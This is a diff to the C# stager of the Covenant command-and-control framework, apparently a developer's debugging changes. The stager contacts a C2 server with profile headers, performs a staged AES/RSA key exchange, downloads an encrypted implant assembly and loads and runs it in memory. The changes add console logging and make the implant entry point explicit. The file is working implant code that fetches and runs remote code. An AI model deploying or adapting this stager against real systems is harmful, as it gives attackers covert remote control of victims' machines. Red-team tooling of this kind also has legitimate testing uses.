@@ -31,10 +31,10 @@ namespace GruntStager
             {
                 List<string> CovenantURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                 string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
-				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                 string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
@@ -80,29 +80,48 @@ namespace GruntStager
                 wc.Proxy = WebRequest.DefaultWebProxy;
                 wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                 string CovenantURI = "";
+                // Initial logs removed
                 foreach (string uri in CovenantURIs)
                 {
                     try
                     {
+                        Console.WriteLine($"[+] Covenant URI Attempt: {uri}");
+
                         for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                         {
+                            string headerName = ProfileHttpHeaderNames[i].Replace("{GUID}", "");
+                            string headerValue = ProfileHttpHeaderValues[i].Replace("{GUID}", "");
+
                             if (ProfileHttpHeaderNames[i] == "Cookie")
                             {
-                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));
+                                string cookieValue = headerValue.Replace(";", ",");
+
+                                // Console.WriteLine($"    [HEADER] Cookie => {cookieValue}");
+                                wc.SetCookies(new Uri(uri), cookieValue);
                             }
                             else
                             {
-                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));
+                                // Console.WriteLine($"    [HEADER] {headerName} => {headerValue}");
+                                wc.Headers.Set(headerName, headerValue);
                             }
                         }
-                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
+
+                        string path = ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", "");
+                        string fullUrl = uri + path;
+
+                        string a = wc.DownloadString(fullUrl);
+
+                        Console.WriteLine($"[✓] Connectivity check successful: {fullUrl}");
                         CovenantURI = uri;
                     }
-                    catch
+                    catch (Exception ex)
                     {
+                        Console.WriteLine($"[!] Error with URI {uri}");
+                        Console.WriteLine($"    Exception: {ex.Message}");
                         continue;
                     }
                 }
+
                 for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                 {
                     if (ProfileHttpHeaderNames[i] == "Cookie")
@@ -114,18 +133,48 @@ namespace GruntStager
                         wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                     }
                 }
-                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+
+                Console.WriteLine("[+] Preparing Stage0 Upload...");
+
+                string postPath = ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)]
+                                    .Replace("{GUID}", GUID);
+                string postUrl = CovenantURI + postPath;
+
+                string formattedRequest = String.Format(ProfileHttpPostRequest, transformedResponse);
+                
+                Console.WriteLine("[+] Sending Stage0 Request...");
+                Stage0Response = wc.UploadString(postUrl, formattedRequest);
+                Console.WriteLine("[+] Stage0 Response Received");
+                Console.WriteLine("Stage0 Body: " + Stage0Response);
+
+                // Console.WriteLine($"[+] Parsing Stage0Response {Stage0Response} \n using ProfileHttpPostResponse: {ProfileHttpPostResponse}");
+                // Console.WriteLine($"[DEBUG] Extracted (pre-invert) Length => {extracted.Length}");
                 string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
+
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
+
                 string iv64str = parsed[3];
                 string message64str = parsed[4];
                 string hash64str = parsed[5];
+
                 byte[] messageBytes = Convert.FromBase64String(message64str);
-                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
+                string computedHash = Convert.ToBase64String(hmac.ComputeHash(messageBytes));
+
+                if (hash64str != computedHash)
+                {
+                    Console.WriteLine("[!] HMAC validation FAILED — aborting stage");
+                    return;
+                }
+
                 SetupAESKey.IV = Convert.FromBase64String(iv64str);
-                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+
+                byte[] PartiallyDecrypted =
+                    SetupAESKey.CreateDecryptor()
+                               .TransformFinalBlock(messageBytes, 0, messageBytes.Length);
+
                 byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);
+
 
                 Aes SessionKey = Aes.Create();
                 SessionKey.Mode = CipherMode.CBC;
@@ -154,7 +203,10 @@ namespace GruntStager
                         wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                     }
                 }
+                Console.WriteLine("[+] Sending Stage1 Request...");
                 Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+                Console.WriteLine("[+] Stage1 Response Received");
+                Console.WriteLine("Stage1 Body: " + Stage1Response);
                 extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -191,7 +243,10 @@ namespace GruntStager
                         wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                     }
                 }
+                Console.WriteLine("[+] Sending Stage2 Request...");
                 Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
+                Console.WriteLine("[+] Stage2 Response Received");
+                Console.WriteLine("Stage2 Body: " + Stage2Response);
                 extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -203,7 +258,9 @@ namespace GruntStager
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
+                 Type t = gruntAssembly.GetType("GruntExecutor.Grunt");
+                MethodInfo m = t.GetMethod("Execute");
+                m.Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
         }
